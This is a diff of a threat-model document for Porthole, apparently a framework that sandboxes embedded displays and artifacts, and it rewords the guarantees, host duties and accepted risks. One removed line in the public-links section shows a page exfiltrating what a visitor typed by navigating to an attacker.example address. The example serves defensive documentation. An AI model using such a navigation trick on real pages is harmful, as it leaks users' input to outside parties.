@@ -3,7 +3,7 @@
 What Porthole protects, from whom, and where that protection ends. For each way of using it
 (S1–S7), it says what Porthole guarantees, what the host must do itself, and what is not
 guaranteed. [ADOPTING.md](ADOPTING.md) says how to set each one up, and
-[DESIGN.md](DESIGN.md) lists every defense with the test that proves it.
+[DESIGN.md](DESIGN.md) says how each defense works and which test proves it.
 
 **Status.** This describes the latest release. What changed in each release is in
 [CHANGELOG.md](../CHANGELOG.md); why, in [DECISIONS.md](DECISIONS.md).
@@ -70,11 +70,11 @@ the agent, but it is not a wall.
      them;
    - the host's fallback for a frame that showed nothing ("open this in a new tab to sign in",
      "you no longer have access", with a link) is drawn from Porthole's pages' word only, never
-     from what the content says (P124, P125; a url-mode app aside, S6). For a served display —
-     where a same-scope sibling could otherwise speak for it ([§7](#the-display-layer)) —
-     that word comes from a **door**: a page of Porthole's on the display's origin, in a hidden
-     opaque frame of the host's that no content can reach, taken before the content is framed. The
-     content frame's own word is then never taken, and its silence is a timeout, never a fallback.
+     from what the content says (P124, P125; a url-mode app aside, S6). A served display's word
+     comes from its **door**: a page of Porthole's on the display's origin, in a hidden opaque frame
+     of the host's that no content can reach, taken before the content is framed. Its content
+     frame's own word is never taken, since a same-scope sibling could speak for it
+     ([§7](#the-display-layer)), and its silence is a timeout, never a fallback.
 
 The app runtime adds a third: **the host's API is the wall for its data.** The bridge refuses a
 call the page didn't declare (`undeclared`), or that the viewer's level doesn't allow, before any
@@ -82,12 +82,12 @@ handler runs. The names a page declares in `data` hold with a viewer and without
 host's API checks again, since a call that reaches the API some other way can claim any
 viewer and any declaration.
 
-The leak suite attempts each channel in DESIGN.md's table from inside the content, on Chromium,
-WebKit and Firefox, and most defenses have a negative control that takes the defense out to show
-its probes then fail (DESIGN.md § "Egress hardening, each with its test"). CI runs every negative
-control on all three engines on the commit of every release (P146: the release's gate requires
-that run; a pull request's CI runs the suite on Chromium, with no control), and a control passes
-only when its marked probes failed by their own assertion (P096).
+The leak suite attempts each channel from inside the content, on Chromium, WebKit and Firefox,
+and most defenses have a negative control that takes the defense out to show its probes then fail
+(DESIGN.md § "Egress hardening, each with its test"). A release's gate requires every negative
+control to pass on all three engines on its commit (P146); a pull request's CI runs the suite on
+Chromium, with no control. A control passes only when its marked probes failed by their own
+assertion (P096).
 
 ## 5. Out of scope
 
@@ -119,17 +119,17 @@ Porthole does not protect against these.
   frame (`focus()` and the like) while the person types in the host's page, and receive the keys
   typed after it, until the person sees their text stop appearing and clicks back. Browsers give a
   host no way to prevent it, nor to tell such a move from the person's own click into the frame
-  (the host's page sees no press inside a cross-site frame). From 0.13 to 0.15 a guard took such
-  moves back on its best guess; the guess refused people's own clicks, and 0.16.0 removed it
-  (§7 "The keyboard"). The walls that hold regardless: content can't read the host's page, its
-  storage or another display, and can't move focus into a field of the host's.
+  (the host's page sees no press inside a cross-site frame). A guard that takes such moves back
+  can only guess, and its guesses refused people's own clicks, so Porthole has none (§7 "The
+  keyboard"). The walls that hold regardless: content can't read the host's page, its storage or
+  another display, and can't move focus into a field of the host's.
 - **A page asking at a moment it picks** (accepted risk, P149). No proof of a click is asked of a
   host function but `copyText`: a page can call `sendPrompt`, `openLink`, `downloadFile`,
   `comments.open`, `artifact.publish` or `assets.delete` as it loads or on a timer. Each still
   ends at the person (a confirmation with the whole effect, or a composer that posts nothing by
   itself), within a rate, and declines mute the display; so the cost is an interruption, which
-  the host may refuse or space out. The click check it replaces proved little (any click on the
-  host's page in the last 5 s passed it) and refused real clicks where the engine didn't pass the
+  the host may refuse or space out. A click check would prove little (any click on the host's
+  page in the last 5 s passed it) and refused real clicks where the engine didn't pass the
   activation up.
 - **Wrong results.** A chart can plot the wrong numbers, and a report can say false things.
 - **Malicious prompts.** A gated `sendPrompt` hands the host's confirm function the whole text (the
@@ -152,7 +152,7 @@ Porthole does not protect against these.
 
 ### What every host must do
 
-Whatever the use:
+Whatever the use (how to wire each: [ADOPTING.md](ADOPTING.md)):
 
 - Send `displays.embedderCsp(…)` (the page's `frame-src`) on every page that shows displays, and
   run `defineHostConformance` against the real page in CI (S1 says why).
@@ -167,18 +167,16 @@ Whatever the use:
 - Show the text content reports (its errors, a blocked navigation's address, an annotation's
   quoted text) only as text, never as HTML.
 - Draw a frame's fallback (what `frameFallback` words, or your own) from its `outcome` alone, never
-  from a message of your own reading off the frame's window: a `blocked` outcome is the word of a
+  from a message of your own reading off the frame's window. A `blocked` outcome is the word of a
   page of Porthole's server, a gateway or your own pages, never of an opaque frame or of content in
-  a frame that speaks (P124, P125). For a served display, that word is its
-  **door**'s (a page of Porthole's on the display's origin, framed hidden and opaque before the
-  content, which a same-scope sibling can't reach, P125); its content frame's own word is never
-  taken, and its silence is a `timeout`. A `blocked` before any frame (`sign-in`, `denied`,
-  `not-found`) is your own issue endpoint's refusal, mapped by `createHost` (P125): its word is
-  your backend's, so what it says is as trustworthy as that endpoint. Hear the `frame-status` host
-  error as a display trying to speak as Porthole, and the `door` host error as a served display
-  refused for having no door (an out-of-date server, a locator that drops it, or a clean address
-  framed as it is: upgrade the server/Worker first, resolve clean addresses through issue, P125):
-  log them, show nothing for them. A url-mode app can still say any outcome (S6).
+  a frame that speaks (P124, P125). For a served display, that word is its door's (§4); its content
+  frame's own word is never taken, and its silence is a `timeout`. A `blocked` before any frame
+  (`sign-in`, `denied`, `not-found`) is your own issue endpoint's refusal, mapped by `createHost`:
+  its word is your backend's, so it is as trustworthy as that endpoint. Hear the `frame-status`
+  host error as a display trying to speak as Porthole, and the `door` host error as a served
+  display refused for having no door (an out-of-date server, a locator that drops it, or a clean
+  address framed as it is: upgrade the server or Worker first, and resolve clean addresses through
+  issue). Log them, and show nothing for them. A url-mode app can still say any outcome (S6).
 - Take what the frame reports about annotations as UI hints (where to draw, what to open), never
   as permissions, and put nothing in a mark the page may not know (§7). A mark's place in the
   document (`documentRect`, with the report's `scroll`, P132) and its last line's
@@ -189,34 +187,35 @@ Whatever the use:
   app with egress, S5, unless you accept it). Take its counts as the bar's numbers, and open your
   bar on `findRequested`, nothing more (§7 "Find in page").
 - Guard a view that a frame's report opens or moves (`activated`, `anchored`, `selected`,
-  `tracked`, `selectionTracked`: a comment's bubble, a composer, a card that follows its mark, a
-  composer that follows the selection (P138), which the page moves at will, up to 60 times a
-  second, and hides and shows again with `inView`). The content chooses when it appears and where, so it can bring it
-  under a press the person meant for the content (a double click on the content's own button whose
-  second click lands on the bubble's). Such a view takes no press of any kind for 500 ms after it
-  appears or moves (not a `click` only: menu triggers act on `pointerdown`, and menu items click
-  themselves on a release), ignores a press that began before that, opens beside the frame rather
-  than over the report's box where the layout allows, takes no focus when it opens, and puts
-  nothing one click away that posts, submits, resolves, deletes or discards (a draft's view, P107,
-  included: no "Post" or "Submit review" in it). Its menus and popovers are part of it, portaled
-  ones too (P105; ADOPTING.md § Annotations has the code: the view `inert` while it arms).
-  One exception to "takes no focus" (P112): in a comment mode the person started themselves (the
-  host's own control, never a report), a composer their selection opens (`selected`) may take
-  focus, with `focusField`, if all it can do is save a draft: nothing in it posts, submits or sends,
-  Enter in it only adds the draft to the batch (submitting is only ever the host's own "Submit N"
-  control, outside the composer), it shows plainly that it is a draft (so the person can see where
-  their keys are going), and the rest of this guard holds (no press for 500 ms, beside the frame). The page still chooses
-  when `selected` comes, so what it can do with that moment is put the person's next keys into a
-  draft they see and can discard, never send one; outside such a mode, or for a composer that can
-  send, it takes no focus.
-  A second exception (P134): a host may move focus into a view a report opened if all of these hold:
-  it reads its own page's `document.activeElement` and that is this frame; the focus goes only to a
-  container that takes no input (`tabindex="-1"`), never a field or a button; and every control in
-  that view that can write has the host's own gate, so that a forged opening and the keys right after
-  it can't submit. The gate covers keys as well as controls: with the focus in that view the person's
-  next keys reach the host's document, so the view's own key handlers and the host's page-wide
-  shortcuts that write (an `r` that resolves, Cmd+Enter that posts) need it too (P137). That's the
-  host's duty: Porthole doesn't guarantee it.
+  `tracked`, `selectionTracked`): a comment's bubble, a composer, a card that follows its mark, a
+  composer that follows the selection (P138). The page moves such a view at will, up to 60 times a
+  second, and hides and shows it again with `inView`. The content chooses when it appears and
+  where, so it can bring it under a press the person meant for the content (a double click on the
+  content's own button whose second click lands on the bubble's). Such a view takes no press of
+  any kind for 500 ms after it appears or moves (not a `click` only: menu triggers act on
+  `pointerdown`, and menu items click themselves on a release), ignores a press that began before
+  that, opens beside the frame rather than over the report's box where the layout allows, takes no
+  focus when it opens, and puts nothing one click away that posts, submits, resolves, deletes or
+  discards (a draft's view, P107, included: no "Post" or "Submit review" in it). Its menus and
+  popovers are part of it, portaled ones too (P105; ADOPTING.md § Annotations has the code: the
+  view `inert` while it arms). Two exceptions to "takes no focus":
+  - (P112) In a comment mode the person started themselves (the host's own control, never a
+    report), a composer their selection opens (`selected`) may take focus, with `focusField`, if
+    all it can do is save a draft: nothing in it posts, submits or sends, Enter in it only adds
+    the draft to the batch (submitting is only ever the host's own "Submit N" control, outside the
+    composer), it shows plainly that it is a draft (so the person can see where their keys are
+    going), and the rest of this guard holds (no press for 500 ms, beside the frame). The page
+    still chooses when `selected` comes, so what it can do with that moment is put the person's
+    next keys into a draft they see and can discard, never send one. Outside such a mode, or for a
+    composer that can send, it takes no focus.
+  - (P134) A host may move focus into a view a report opened if all of these hold: it reads its
+    own page's `document.activeElement` and that is this frame; the focus goes only to a container
+    that takes no input (`tabindex="-1"`), never a field or a button; and every control in that
+    view that can write has the host's own gate, so that a forged opening and the keys right after
+    it can't submit. The gate covers keys as well as controls: with the focus in that view the
+    person's next keys reach the host's document, so the view's own key handlers and the host's
+    page-wide shortcuts that write (an `r` that resolves, Cmd+Enter that posts) need it too (P137).
+    That's the host's duty: Porthole doesn't guarantee it.
 - Know that a display can take the keyboard: a page calls `focus()` on its own input whenever it
   likes (on Chromium and WebKit with no gesture), and what the person goes on typing goes to it
   until they click back. Nothing gives it back for them (§5, §7 "The keyboard"). Where a field
@@ -236,20 +235,20 @@ Whatever the use:
   domain for a shared site.
 - Where another app frames yours (P141), name its origins in `framedBy`, never in `appOrigins`: it
   may then be an ancestor of your frames, above your own page, and is never their host. Your page
-  must still be the frame's parent: an outer page that frames content directly (with an address it
+  must still be the frame's parent. An outer page that frames content directly (with an address it
   got from somewhere) is let in by the browser, but the frame takes nothing from it (no handshake,
-  no host function), Porthole's own pages tell it nothing, and what it
-  can hear is the content's own word to its parent (`*`), which it must treat as untrusted. Your
-  app page's own `frame-ancestors` is yours to set; Porthole never sends it. Name exact origins of
-  that one product, and drop them when it stops framing you.
+  no host function), Porthole's own pages tell it nothing, and what it can hear is the content's
+  own word to its parent (`*`), which it must treat as untrusted. Your app page's own
+  `frame-ancestors` is yours to set; Porthole never sends it. Name exact origins of that one
+  product, and drop them when it stops framing you.
 - In the nesting `framedBy` is for (the outer page, then your app's page, then content), content
   is a descendant of the outer page (P144): it can `postMessage` the outer page (`top`) and every
   frame in its tree, and learn the outer page's origin (measured in Chromium and Firefox). No
   header stops that. Tell the outer page's authors: every message listener on the outer page and in
   each of its frames must check `event.source` and `event.origin`, taking a message only from the
   window and origin it expects (your app's page), and treat any other as content's untrusted word.
-  S7's rule now covers the outer page's frames: what content was given can be handed to any frame
-  the outer page shows, so the widest network among them is content's way out.
+  S7's rule covers the outer page's frames: what content was given can be handed to any frame the
+  outer page shows, so the widest network among them is content's way out.
 - Under the app runtime, run `defineRuntimeConformance` with `api` in CI (§7).
 
 ### S1. Inline widgets in a conversation
@@ -264,10 +263,9 @@ Whatever the use:
   capability or the egress config names an origin), `form-action 'none'`, `frame-src 'none'`,
   `base-uri 'none'`, `object-src 'none'` and `webrtc 'block'`, and no `'self'` anywhere. Before
   content runs, the shell removes the `RTC*` constructors, drops nested frames, plugins and
-  resource hints as they are inserted, and makes `document.open` and `write` throw. Where the host
-  opts into the content's own frames (`nestedFrames: "own"`, P128; off by default), the shell keeps
-  `srcdoc` iframes (an inline widget has no files of its own) and drops every other frame and
-  plugin as before, a kept frame included once a change would point it elsewhere.
+  resource hints as they are inserted, and makes `document.open` and `write` throw. With
+  `nestedFrames: "own"` (P128; off by default) it keeps `srcdoc` iframes and drops every other
+  frame and plugin, a kept frame included once a change would point it elsewhere.
 - While it streams, drafts are drawn inert (no scripts, handlers or navigation); the whole runs
   once.
 - Only the host functions the config declares exist, each behind its default gates:
@@ -379,19 +377,19 @@ them):
 
 ### S3. Private artifacts
 
-`presets.artifact` with `isolation: "domain"`, served by the host kit to a signed-in viewer.
+`presets.artifact` with `isolation: "domain"`, served by the host kit to a signed-in viewer
+(setup: [ADOPTING.md](ADOPTING.md) § 4, "The server").
 
-Terms used below: a page's **clean address** is its address on its own content origin, with no
-ticket in it, the one a person opens in a tab or shares (a path on `<label>.<content domain>`). A
-framed page's **sealed files address** is `/__porthole/f/<sealed>/`: the frame's session,
-encrypted into the path, since WebKit keeps no cookie in a frame (P083).
+Terms: a page's **clean address** is its address on its own content origin, with no ticket in it,
+the one a person opens in a tab or shares (a path on `<label>.<content domain>`). A framed page's
+**sealed files address** is `/__porthole/f/<sealed>/`: the frame's session, encrypted into the
+path, since WebKit keeps no cookie in a frame (P083).
 
 **Porthole guarantees**
 
-- An origin per storage scope on the content domain, by default a label made from an HMAC of the
-  scope under a key derived from the host's secret (120 bits). A label is an address, not a
-  secret: a host may name labels itself (`prefixedName`), and access is the ticket's and the
-  cookie's job.
+- An origin per storage scope on the content domain: by default a label made from an HMAC of the
+  scope under a key derived from the host's secret (120 bits). A label is an address, not a secret
+  (a host may name labels itself, `prefixedName`): access is the ticket's and the cookie's job.
 - `createContentHost` refuses a content domain that holds an app origin or may share a site with
   one (`ContentDomainError`), and a served mount refuses a content origin same-site with the app.
   With `health` configured, frames fall back to opaque while the content domain doesn't answer.
@@ -402,19 +400,18 @@ encrypted into the path, since WebKit keeps no cookie in a frame (P083).
 - Only cookies Porthole set are read as its own: under https only `__Host-porthole-` names, which
   no other label can set; the entered mark names its label. A session names its scope, signed, so
   another label's session is never read as this one's, under https or on loopback (P101).
-- Pages, files and status pages carry their CSP in headers and `X-Robots-Tag: noindex`, and
-  `frame-ancestors` names the app's origins only (with `nestedFrames: "own"`, P128, a file set's
-  files below its base name the page's own origin too, so its pages frame them), then the host's
-  `framedBy`, if any (P141): ancestors above the app's page, never its host.
+- Pages, files and status pages carry their CSP in headers and `X-Robots-Tag: noindex`.
+  `frame-ancestors` names the app's origins only, then the host's `framedBy`, if any (P141:
+  ancestors above the app's page, never its host). With `nestedFrames: "own"` (P128), a file set's
+  files below its base also name the page's own origin, so its pages frame them.
 - Files: from the version's manifest only, typed by Porthole's table, `nosniff`; files other than
   pages are `Cross-Origin-Resource-Policy: same-origin`; a file set never registers a service
   worker; a page's CSP opens its own version's path, not its whole origin.
-- A page's nested frames are removed, a `srcdoc` one and one of its own files alike, unless the
-  host opts in (`nestedFrames: "own"`, P128). Then an iframe of one of its version's own files or
-  with `srcdoc` loads and runs (a page of the set with its own shell), and every other frame
-  (another site, another path of the origin, a scheme, an empty one) and plugin is removed: the
-  page's `frame-src` opens its version's path alone, which also governs every navigation of its
-  frames.
+- A page's nested frames are all removed unless the host opts in (`nestedFrames: "own"`, P128).
+  Then only an iframe of its version's own files or with `srcdoc` runs (a page of the set with its
+  own shell); every other frame (another site, another path, a scheme, an empty one) and plugin is
+  removed, and the page's `frame-src`, which opens its version's path alone, governs every
+  navigation of its frames.
 - With a per-request check (`authorize`), the host decides again on every request; a deny is a
   403 that says `denied`.
 
@@ -427,8 +424,8 @@ encrypted into the path, since WebKit keeps no cookie in a frame (P083).
   so a guessable secret can be tested offline.
 - Give a per-request check (`authorize`) to revoke: sessions are signed and stateless, so without
   it a cookie is good for its whole life (an hour by default, up to 30 days). Leave its answers
-  uncached (the default; `authorizeTtlSeconds` in the host kit) or call `content.forget(…)` when
-  revoking, or a cached answer holds for up to that long.
+  uncached (the default; `authorizeTtlSeconds`) or call `content.forget(…)` when revoking, or a
+  cached answer holds for up to that long.
 - Send the page's `frame-src`.
 
 **Not guaranteed**
@@ -451,11 +448,10 @@ encrypted into the path, since WebKit keeps no cookie in a frame (P083).
 - A revocation reaches the next request. It doesn't reach a page already running, an open
   WebSocket, pinned files the browser cached (immutable for a year), or assets in bearer mode
   (§7).
-- With `nestedFrames: "own"` (P128), a page has WebRTC: every iframe it keeps starts as an
-  `about:blank` of its own origin, which it reaches before anything loads there, and a `srcdoc`
-  frame runs none of the shell's defenses (resource hints, `document.write`, and a click's
-  `execCommand("copy")` and copy listeners, which put text on the clipboard with no notice). Its
-  frames can't navigate out of its version's path, and their sandbox is the page's.
+- With `nestedFrames: "own"` (P128), a page has WebRTC (every iframe it keeps starts as an
+  `about:blank` of its own origin, which it reaches first), and a `srcdoc` frame runs none of the
+  shell's defenses (as S1 lists). Its frames can't navigate out of its version's path, and their
+  sandbox is the page's.
 
 ### S4. Public links, and pages that are apps
 
@@ -475,29 +471,26 @@ the attacker (c), and its readers are strangers.
   so it is never punycode for another name; pages say `noindex`; a file of a type Porthole
   doesn't know is served as a download.
 - `authorize` is the host's takedown switch.
-- An embedded document (P143, `Grant.embed`, only where the host set `embeds`): its answers say
-  `frame-ancestors *` for that session alone, never a reader's; it is anonymous, with no level or
-  user, an artifact's page; its plan names no host, so it hears no one, Porthole
-  tells no parent anything, no capability or runtime host function runs, and no door is minted. The
-  flag is signed into the session and the sealed address. Every other session's answers are, byte
-  for byte, what the same server without `embeds` answers, while an embed session of the same
-  artifact exists; cookies stay host-only. The host kit never mints one from `access` (its reader's
-  issue endpoint and clean addresses refuse an `embed` answer, P145).
-- A page opened in a tab of its own has its frame's powers and no more (P099): its CSP header
+- An embedded document (P143, `Grant.embed`, only where the host set `embeds`) is anonymous, with
+  no level or user, an artifact's page, and only its session's answers say `frame-ancestors *`.
+  It names no host: it hears no one, Porthole tells no parent anything, no capability or runtime
+  host function runs, and no door is minted. The flag is signed into the session and the sealed
+  address. Every other session's answers are, byte for byte, what the server without `embeds`
+  answers, even while an embed session of the same artifact exists; cookies stay host-only. The
+  host kit never mints one from `access` (its issue endpoint and clean addresses refuse it, P145).
+- A page opened in a tab of its own has its frame's powers and no more (P099). Its CSP header
   carries the frame's sandbox (scripts on its own origin; no popups, forms, downloads, browser
   dialogs, or navigation of another window, its opener's included), and its `Permissions-Policy`
-  header denies what the frame's `allow` doesn't grant (camera, microphone, location, full
-  screen, passkeys, payments, sharing, the built-in AI models, and every other feature a frame
-  lacks by default). The shell adds its own walls there, the only ones on engines that don't apply
-  that header (WebKit, Firefox): `window.open` answers null; picture-in-picture windows, devices,
-  location, full screen, passkeys, the share sheet and payments (Apple Pay too) are refused at
-  once; and its navigation guard stops the page navigating itself away, by `location` (set,
-  `assign`, `replace`), a link, `navigation.navigate()` or `open(…, "_self")`. The last three ask
-  the guard's rule before they start (WebKit sends a link's and `navigate()`'s request otherwise),
-  read the address once, and read it through the platform's own functions, so a page can't
-  hand them one address to check and another to go to; a link, in a shadow root too, is followed
-  by the shell as it was when clicked, never by the browser as a later listener left it.
-  `defineHostConformance`'s `served.domain.tab-*` cases check it through the host's real edge.
+  denies what the frame's `allow` doesn't grant (camera, microphone, location, full screen,
+  passkeys, payments, sharing, the built-in AI models, and every other feature a frame lacks by
+  default). The shell's own walls, the only ones on engines that don't apply that header (WebKit,
+  Firefox): `window.open` answers null; picture-in-picture, devices, location, full screen,
+  passkeys, the share sheet and payments (Apple Pay too) are refused at once; and its navigation
+  guard stops the page navigating itself away by `location` (set, `assign`, `replace`), a link,
+  `navigation.navigate()` or `open(…, "_self")`, with no way to have one address checked and go to
+  another (a link, in a shadow root too, is followed as it was when clicked; how: DESIGN.md §
+  "Served content, each with its test"). `defineHostConformance`'s `served.domain.tab-*` cases
+  check it through the host's real edge.
 
 **The host must**
 
@@ -510,37 +503,32 @@ the attacker (c), and its readers are strangers.
 - Rate-limit the issue endpoint (`rateLimit`: optional, per process). An anonymous request is
   keyed by an address the client can't set (P092): the socket's peer through Porthole's Node
   adapter, `CF-Connecting-IP` on Workers. Anywhere else, or behind proxies, every anonymous request
-  shares one limit unless you set `rateLimit.trustedProxies` (how many proxies append to
-  `X-Forwarded-For`; only where the app is reachable through those proxies alone) or
-  `rateLimit.key`.
+  shares one limit unless you set `rateLimit.trustedProxies` (only where the app is reachable
+  through those proxies alone) or `rateLimit.key` (ADOPTING.md § 4, "The server").
 - Check pages for secrets before publishing them: `lintContent` has no rule for credentials.
 - Pass Porthole's `Content-Security-Policy` and `Permissions-Policy` headers on as they are,
   through any edge or proxy: on a tab they are the page's sandbox.
 - For embeds (P143): mint `embed` from one route of yours alone (never a reader's ticket or door;
-  with the host kit, `host.server.issue`, never `access`, which it refuses, P145), keep that route
-  from widening grants, and blank a takedown within a bound you state (your `authorize` answers,
-  cached or not). The embedding site sees the page load and hears what the page itself posts to its
-  parent or top. The page learns where it is embedded (P145, measured in Chromium, Firefox and
-  WebKit): its document's request carries your outer page's address as `Referer` (its origin, under
-  the default referrer policy; Firefox also sends it as `Origin`, Chromium and WebKit don't),
-  `document.referrer` says the same,
-  and `location.ancestorOrigins` names every ancestor, the embedding site's origin included. A page
-  with any egress (a `connect-src`, an image source) can send that out; one with none can't. Treat
-  where an embed is shown as known to its author.
+  with the host kit, `host.server.issue`, never `access`, P145), keep that route from widening
+  grants, and blank a takedown within a bound you state (your `authorize` answers, cached or not).
+  The embedding site sees the page load and hears what the page posts to its parent or top. The
+  page learns where it is embedded (P145, measured in Chromium, Firefox and WebKit): its request's
+  `Referer` names your outer page (its origin under the default referrer policy; Firefox also
+  sends `Origin`), `document.referrer` says the same, and `location.ancestorOrigins` names every
+  ancestor, the embedding site included. A page with any egress (a `connect-src`, an image source)
+  can send that out; one with none can't. Treat where an embed is shown as known to its author.
 - Treat a public link's clean address as a tab's (P125): to show what one names in a frame, resolve
   it through your issue endpoint (`client.resolve`, `<PortholeView address>`). Its refusals (signed
-  out, denied, not found) are your backend's word, drawn as the fallback with no frame built: keep
-  that endpoint's answers as honest as its access decision, since a `blocked` there is yours, not
-  Porthole's door's.
+  out, denied, not found) are drawn as the fallback with no frame built: a `blocked` there is your
+  backend's word, not the door's, so keep those answers as honest as the access decision.
 
 **Not guaranteed**
 
-- In a browser without the Navigation API (older Safari and Firefox releases), a page opened in
-  a tab can navigate itself away with data in the address (`location = "https://attacker.example/?"
-  + whatTheVisitorTyped`): the shell's guard gets no events there, and a tab has no embedding page
-  whose `frame-src` would stop it. It can also go to a `blob:` document it wrote itself, where
-  the shell never runs: the CSP and its sandbox carry over, the `Permissions-Policy` header and
-  the shell's walls don't (WebRTC is there, and a granted location). No CSP directive closes
+- In a browser without the Navigation API (older Safari and Firefox), a page opened in a tab can
+  navigate itself away with data in the address: the shell's guard gets no events there, and a tab
+  has no embedding page whose `frame-src` would stop it. It can also go to a `blob:` document it
+  wrote, where the shell never runs: the CSP and its sandbox carry over, the `Permissions-Policy`
+  and the shell's walls don't (WebRTC is there, and a granted location). No CSP directive closes
   either (P099, accepted). A host that must cover such browsers shows public pages in its own
   frame.
 - `db` and `user` reach the author without any network: what viewers write, and `user.get()`'s
@@ -627,10 +615,9 @@ the attacker (c), and its readers are strangers.
   cookies included: send the app the headers `upstreamHeaders.request(…, { websocket: true })`
   makes (Porthole's cookies removed, the upgrade's own headers kept).
 - Keep previews off pages with displays that read data (S7).
-- Expect a served (domain) display's `blocked` from two sources only (P125): its door, or, before
-  any frame, your own issue endpoint's refusal (`sign-in`, `denied`, `not-found`). Neither is the
-  previewed app's word; a url-mode app's frame status still is (above), so never put a preview's
-  outcome in the same place in your UI as a served display's.
+- Never put a preview's outcome in the same place in your UI as a served display's: a served
+  display's `blocked` comes only from its door or your issue endpoint (P125), a url-mode app's from
+  the app (below).
 
 **Not guaranteed**
 
@@ -675,26 +662,25 @@ can be handed to the display with the widest network.
 - An opaque frame also inherits the page's own CSP, so a strict page narrows its opaque frames
   further (P058). A served frame has only its own policy.
 
-**What sharing a scope costs, which Porthole does not stop** (the premise is a scope its author
-controls — one person's artifact and its versions, one session's widgets — not a scope shared across
-people who distrust each other). A scope's displays share one origin and run
-content there with `allow-same-origin`, so one reaches another's document (`top[i]`) and its storage.
-P125 stops a sibling speaking Porthole's word for another display (its door says how loading went,
-unreachably), but a sibling of the scope can still, against another display of it:
+**What sharing a scope costs, which Porthole does not stop.** The premise is a scope its author
+controls (one person's artifact and its versions, one session's widgets), not a scope shared across
+people who distrust each other. A scope's displays share one origin and run content there with
+`allow-same-origin`, so one reaches another's document (`top[i]`) and its storage. The door stops a
+sibling speaking Porthole's word for another display (P125), but a sibling of the scope can still,
+against another display of it:
 
 - spend its three restarts (`MAX_RESTARTS`) by reloading or wiping it, so its outcome is a
   `timeout` or, once the restarts run out, `blocked: error` (a fallback, no link) the person may
   read as the display's own. It always has an outcome: restarts don't start its clock again (one
   `loadTimeoutMs` per loading episode, from its first run until an outcome), and a frame stopped
-  after its restarts is `blocked: error` (found by Cato on WebKit during P125: before, it was
-  stopped with no outcome at all, an empty box);
-- deface it — rewrite its document — since they share an origin;
+  after its restarts is `blocked: error`;
+- deface it (rewrite its document), since they share an origin;
 - read a sandbox-proxy view's HTML once the host has sent it into the view.
 
 These are the costs of putting displays an author controls in one scope. To deny them, put displays
-that distrust each other in **different scopes** (different origins): there is no other way since
-0.16.0 removed nested pages (P149). What a sibling cannot do is forge Porthole's own
-fallback (a sign-in prompt with a link out): that is the door's wall (P125).
+that distrust each other in **different scopes** (different origins): there is no other way
+(P149). What a sibling cannot do is forge Porthole's own fallback (a sign-in prompt with a link
+out): that is the door's wall (P125).
 
 ## 7. The display layer and the app runtime
 
@@ -714,323 +700,200 @@ wall on three engines, and `defineHostConformance` runs it against a host's own 
 **The host must** do what [every host](#what-every-host-must-do) does, write the handlers (their
 effects are its own), and group displays by page (S7).
 
-**The host's fallback** (P040, P124). A display's `outcome` says how its frame loaded, and a host
-draws its own UI on a `blocked` one, in Porthole's wording (`frameFallback`: "Open this in a new
-tab to sign in", "You can't open this anymore") with a link out of the page: UI the person takes
-for the host's and Porthole's, which content must not be able to summon. A `blocked` comes from a
-frame status (`porthole/notifications/frame-status`), and nothing in that message says who sent
-it: Porthole's status pages are documents of the frame's own window and origin, as content is. So
-the host takes one only where content can't have said it. **A served display** (a
-served shell, a page, a view through the sandbox proxy) is framed on its scope's origin, where the
-scope's others run content with `allow-same-origin`: one of them reaches a new document there before
-its first script runs and could speak for it, so **no frame status from its own frame is ever
-taken** (each run, the first is dropped with one `frame-status` host error), and its silence is a
-`timeout`, never a fallback. Its word comes from its **door** instead (P125): a page of Porthole's
-on the same origin, in a hidden opaque frame of the host's own (`sandbox="allow-scripts"`, no name,
-`inert`, 0×0) that no content shares an origin with and no sandboxed sibling can navigate, taken
-before the content frame is made — `open`, or `blocked` and why. An **opaque frame**'s every status is the content's; a **url-mode app**'s is taken (S6).
+**The host's fallback** (P040, P124, P125). On a `blocked` outcome the host draws its own UI in
+Porthole's wording (`frameFallback`: "Open this in a new tab to sign in", "You can't open this
+anymore") with a link out of the page. The person takes it for the host's and Porthole's, so
+content must not be able to summon it. A frame status (`porthole/notifications/frame-status`) says
+nothing of who sent it: Porthole's status pages are documents of the frame's own window and origin,
+as content is. So:
 
-This closes the audit of 2026-10-30 (P124-1): before P125, a served display could
-be spoken for by a same-scope sibling — the sibling reached a new document of its scope (`top[i]`,
-same origin before the shell ran), posted a frame status taken as the run's first word, or stopped
-or rewrote it so its silence read as `framing`, or reloaded a running one into a new run it spoke
-first in. The door closes every route: the sibling can't read, navigate or speak from it (it is
-opaque, unnamed, host-sandboxed), and the content frame's own word and silence are no longer taken.
-P124-2 is closed too: a file set's entry must be a page (`.html`/`.htm`; `checkFileSet`,
-`admitFiles`, `lintFiles` refuse another), and a set stored before that rule answers Porthole's
-`not-found` status page — the door says `not-found`, never an inert file that says nothing.
+- **A served display** (a served shell, a page, a view through the sandbox proxy) shares its
+  scope's origin with content that runs with `allow-same-origin` and can reach a new document
+  there before its first script runs. So **no frame status from its own frame is ever taken**
+  (each run, the first is dropped with one `frame-status` host error), and its silence is a
+  `timeout`, never a fallback. Its word is its **door**'s (§4): a page of Porthole's on the same
+  origin, in a hidden frame of the host's (`sandbox="allow-scripts"`, no name, `inert`, 0×0) that
+  no content shares an origin with and no sandboxed sibling can navigate, taken before the content
+  frame is made (`open`, or `blocked` and why). A sibling can't read, navigate or speak from it.
+  No timing rule can stand in for it: a `load` event is not a committed document.
+- An **opaque frame**'s every status is the content's; a **url-mode app**'s is taken (S6).
+- A served location without a door (a server older than the host, a locator that drops it, a
+  clean address framed as it is) is refused before any frame: `blocked: locate` and a `door` host
+  error. In a frame, a clean address gets a page with no script that goes nowhere, never the app's
+  authorize or sign-in; the host resolves it through its issue endpoint first (S4).
+- A file set's entry must be a page (`.html`/`.htm`; `checkFileSet`, `admitFiles` and `lintFiles`
+  refuse another). A set stored before that rule answers Porthole's `not-found` status page.
 
-The known costs that remain are the costs of sharing a scope (S7). A served location
-without a door (a server older than the host, a locator that drops it, a clean address framed as it
-is) is refused before any frame: `blocked: locate` and a `door` host error (P125). A clean address
-is for a tab: in a frame the content origin answers it with a page that has no script and goes
-nowhere, never the app's authorize or sign-in. To show what a clean address names in a frame, the
-host resolves it through its issue endpoint first, and a refusal there (signed out, denied, not
-found) is the display's outcome with no frame built. P125 also records why no timing rule can stand
-in for that: a `load` event is not a committed document (DECISIONS P125).
+What remains are the costs of sharing a scope (S7).
 
-**Annotations** (`annotate`, P053, P104, P107). The shell that draws marks and reports anchors shares
+**Annotations** (`annotate`, P053, P104, P107). How it works, and the control that proves each
+point: [DESIGN.md](DESIGN.md) § Annotations. The shell that draws marks and reports anchors shares
 its realm with the content, so:
 
